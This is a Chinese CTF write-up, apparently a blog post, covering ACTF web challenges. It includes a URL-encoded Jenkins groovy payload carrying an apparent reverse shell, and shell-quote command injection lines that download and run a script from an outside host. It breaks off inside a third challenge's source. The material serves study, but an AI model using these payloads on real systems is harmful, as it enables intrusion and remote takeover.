<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">68</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">70</span>%3a%2f%2f%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%3a%<span class="number">38</span>%<span class="number">30</span>%<span class="number">38</span>%<span class="number">30</span>%2f%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">52</span>%<span class="number">65</span>%<span class="number">61</span>%6c%6d%2f%<span class="number">75</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%2f%<span class="number">61</span>%<span class="number">64</span>%6d%<span class="number">69</span>%6e%2f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%6f%<span class="number">72</span>%<span class="number">42</span>%<span class="number">79</span>%4e%<span class="number">61</span>%6d%<span class="number">65</span>%2f%6f%<span class="number">72</span>%<span class="number">67</span>%2e%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">69</span>%2e%<span class="number">70</span>%6c%<span class="number">75</span>%<span class="number">67</span>%<span class="number">69</span>%6e%<span class="number">73</span>%2e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%2e%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%2e%<span class="number">67</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%2e%<span class="number">53</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">47</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%2f%<span class="number">63</span>%<span class="number">68</span>%<span class="number">65</span>%<span class="number">63</span>%6b%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3f%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%3d%<span class="number">74</span>%<span class="number">72</span>%<span class="number">75</span>%<span class="number">65</span>%<span class="number">26</span>%<span class="number">76</span>%<span class="number">61</span>%6c%<span class="number">75</span>%<span class="number">65</span>%3d%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span></span><br></pre></td></tr></tbody></table></figure>
<p>最终 exp,👴の最後のエクスプロイト (exloit)</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/evil'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"http://124.70.33.170:8088/redirect?redirect_url=%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3d%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%36%33%25%36%63%25%36%31%25%37%33%25%37%33%25%32%30%25%37%38%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%37%38%25%32%38%25%32%39%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%32%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%33%25%32%30%25%37%62%25%36%35%25%36%33%25%36%38%25%36%66%25%32%63%25%35%39%25%36%64%25%34%36%25%37%61%25%36%31%25%34%33%25%34%31%25%37%34%25%36%31%25%35%33%25%34%31%25%32%62%25%34%61%25%36%39%25%34%31%25%37%36%25%35%61%25%34%37%25%35%36%25%33%32%25%34%63%25%33%33%25%35%32%25%36%61%25%36%33%25%34%33%25%33%38%25%33%30%25%34%64%25%37%39%25%33%34%25%37%38%25%34%65%25%34%34%25%34%64%25%37%35%25%34%64%25%35%34%25%36%62%25%37%39%25%34%63%25%36%61%25%34%35%25%33%35%25%34%63%25%37%61%25%34%35%25%37%38%25%34%65%25%34%34%25%35%35%25%36%37%25%34%64%25%34%34%25%33%34%25%36%64%25%34%64%25%35%31%25%33%64%25%33%64%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%63%25%32%64%25%36%34%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%38%25%32%63%25%32%64%25%36%39%25%37%64%25%32%32%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%37%35%25%37%34%25%36%35%25%32%38%25%32%39%25%30%61%25%32%30%25%32%30%25%37%64%25%30%61%25%37%64"</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031083826.png" alt="微信截图_20231031083826"></p>
<p>哈哈哈哈哈！欺骗世界这种事情，对于👴来说，简直小菜一碟.</p>
<p>わたしは強い　あなたたちより強い！</p>
<p>这一切都是命运石之门的选择！</p>
<h1 id="~ave-mujicas-masquerade~"><span id="~ave-mujicas-masquerade~"> ~Ave Mujica’s Masquerade~</span></h1>
<p>「お幸せに」, 希啊哇赛你妹的，👴很😡😡.</p>
<h2 id="源码冲"><span id="源码冲"> 源码，冲😓</span></h2>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/checker'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">let</span> url = req.<span class="property">query</span>.<span class="property">url</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (url) {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> host;</span><br><span class="line">    <span class="keyword">let</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MakE it Safer!!!!! </span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="title function_">includes</span>(<span class="string">":"</span>)) {</span><br><span class="line">      <span class="keyword">const</span> parts = url.<span class="title function_">split</span>(<span class="string">":"</span>);</span><br><span class="line">      host = parts[<span class="number">0</span>];</span><br><span class="line">      port = parts.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">":"</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      host = url;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (port) {</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">"nmap"</span>, <span class="string">"-p"</span>, port, host]); <span class="comment">// Construct the shell command</span></span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">"nmap"</span>, <span class="string">"-p"</span>, <span class="string">"80"</span>, host]);</span><br><span class="line">    }</span><br><span class="line">    nmap = <span class="title function_">spawn</span>(<span class="string">"bash"</span>, [<span class="string">"-c"</span>, command]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(command);</span><br><span class="line">    </span><br><span class="line">    nmap.<span class="title function_">on</span>(<span class="string">'exit'</span>, <span class="keyword">function</span> (<span class="params">code</span>) {</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'child process exited with code '</span> + code.<span class="title function_">toString</span>());</span><br><span class="line">      <span class="keyword">if</span> (code !== <span class="number">0</span>) {</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Error executing command!!!`</span>);</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Ok...`</span>);</span><br><span class="line">      }</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">'No parameter provided.'</span>);</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
<p>不多 bb, 就是打这个 checker 路由.</p>
<p>👴觉得 shellQuote,quote 很陌生，很不对劲，怎么办，搜 exp!</p>
<p>别跟👴说你不会搜，nmd 不要用国内的答辩引擎，上🥁🕊直接:shellQuote exploit</p>
<p>第一个就是了，其它都不好使:<a target="_blank" rel="noopener" href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">Exploiting CVE-2021-42740 (wh0.github.io)</a></p>
<p>不说人话:shell-quote 包通常用于转义不受信任的输入，以便在 shell 命令中使用。此示例采用不受信任的输入，引用它，并通过一个命令运行它，该命令将其打印出来。我们只希望它返回一个字符串，而不是允许不受信任的输入运行任意命令。假设我们在路径中调用 pwnme 了这个程序，如果它被执行，我们就失败了我们的安全目标：</p>
<p>有点难懂，来个 demo 试一下.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title class_">String</span>(s).<span class="title function_">replace</span>(<span class="regexp">/([A-z]:)?([#!"$&amp;'()*,:;&lt;=&gt;?@\[\\\]^`{|}])/g</span>, <span class="string">'$1\\$2'</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>最好在虚拟机上用，test.js 如下</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellQuote = <span class="built_in">require</span>(<span class="string">'shell-quote'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> untrusted = process.<span class="property">argv</span>[<span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'untrusted'</span>, untrusted);</span><br><span class="line"><span class="keyword">const</span> result = childProcess.<span class="title function_">execSync</span>(shellQuote.<span class="title function_">quote</span>([<span class="string">'printf'</span>, <span class="string">'%s\n'</span>, untrusted]));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'result'</span>, result);</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">'`:`./pwnme``:`'</span></span><br></pre></td></tr></tbody></table></figure>
<p>这里的</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'`:`pwnme``:`'</span></span><br></pre></td></tr></tbody></table></figure>
<p>相当于 untrsuted,👴直接就说了.</p>
<p>pwnme 输入</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/bin/</span>sh</span><br><span class="line">touch /tmp/i-am-pwned</span><br><span class="line">echo <span class="string">"oh no"</span></span><br></pre></td></tr></tbody></table></figure>
<p>输入命令</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">'`:`./pwnme``:`'</span></span><br></pre></td></tr></tbody></table></figure>
<p>直接就能执行 pwnme 里面的内容了</p>
<p>空格被 ban 怎么办，用 $IFS, 别这也要👴教.</p>
<p>你现在明白了怎么绘世了.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command = shellQuote.<span class="title function_">quote</span>([<span class="string">"nmap"</span>, <span class="string">"-p"</span>, port, host]);</span><br></pre></td></tr></tbody></table></figure>
<p>现在也就是要控制 <code>port</code>  了</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"127.0.0.1:`:`wget$IFS``:`</span></span><br></pre></td></tr></tbody></table></figure>
<p>$IFS</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">20</span>%<span class="number">09</span>%0A%<span class="number">00</span>%0A</span><br></pre></td></tr></tbody></table></figure>
<p>$9</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">09</span></span><br></pre></td></tr></tbody></table></figure>
<p>先下载</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url="127.0.0.0:`:`wget$IFS$943.143.192.19:7777/a.sh``:`</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150210.png" alt="微信截图_20231031150210"></p>
<p>报错并无关系，已经执行力.</p>
<p>再执行</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url="127.0.0.0:`:`bash$IFS$9a.sh``:`</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150159.png" alt="微信截图_20231031150159"></p>
<p>芜湖，奥利安费，太 tm 爽了.</p>
<p>👴顺便说一下，用斜杠也能绕过</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url="127.0.0.0:`:`bash$IFS\a.sh``:`</span></span><br></pre></td></tr></tbody></table></figure>
<h1 id="story"><span id="story"> story</span></h1>
<p>これは、わたしの物語🤣,wcsndm 题目环境没了，自己本地搭 docker.</p>
<p>不过问题不大，因为👴魔改了一下源码，一样能和题目效果差不多</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="built_in">str</span>(uuid.uuid4())</span><br></pre></td></tr></tbody></table></figure>
<p>为了保证题目密钥的随机性，👴改成了这 b 玩意，👴可太 nb 了</p>
<p>不多 bb, 先上源码，让👴来看看怎么个事😊</p>
<h2 id="源码"><span id="源码"> 源码🤔</span></h2>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">'captcha'</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'image/png'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    }</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">'/vip'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">'captcha'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">'vip'</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/story'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">story</span>():</span><br><span class="line">    story = session.get(<span class="string">'story'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> story <span 